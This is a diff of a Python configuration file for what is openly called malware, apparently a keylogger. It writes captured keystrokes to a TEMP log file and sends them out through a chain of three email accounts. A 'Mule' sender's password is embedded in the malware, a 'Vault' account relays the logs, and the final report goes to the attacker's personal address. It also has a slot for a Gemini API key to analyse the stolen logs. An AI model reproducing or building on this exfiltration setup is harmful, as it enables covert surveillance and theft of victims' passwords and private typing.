@@ -1,11 +1,30 @@
-# config.py.example
-
+"""
+Module: Configuration Settings
+Description: Centralizes credentials for the 3-Email Chain architecture.
+"""
 import os
 
 LOG_FILE = os.path.join(os.getenv('TEMP'), "key_log.txt")
 
-SENDER_EMAIL = "your-email@example.com"
-EMAIL_PASSWORD = "your-app-password" # Get this from Google App Passwords
-RECEIVER_EMAIL = "your-receiver@example.com"
+# --- EMAIL CHAIN CONFIGURATION ---
 
-SEND_REPORT_EVERY = 60 # Seconds
+# MAIL 1: The "Mule" (Sends raw logs every 60s)
+# This password IS stored in the malware.
+RAW_LOG_SENDER = "bot_sender_mail1@gmail.com"
+RAW_LOG_PASSWORD = "mail1_app_password"
+
+# MAIL 2: The "Vault" (Receives logs, Sends Daily Report)
+# This password is NOT used by the malware (only by the Analyzer).
+RAW_LOG_RECEIVER = "bot_vault_mail2@gmail.com"
+RAW_LOG_RECEIVER_PASSWORD = "mail2_app_password"
+
+# MAIL 3: The "Master" (Attacker Personal Email)
+# Receives only the final cleaned report.
+FINAL_REPORT_RECEIVER = "your_personal_mail3@gmail.com"
+
+# ---------------------------------
+
+SEND_REPORT_EVERY = 60
+
+# AI Analysis (Google Gemini)
+API_KEY = "YOUR_GEMINI_API_KEY"
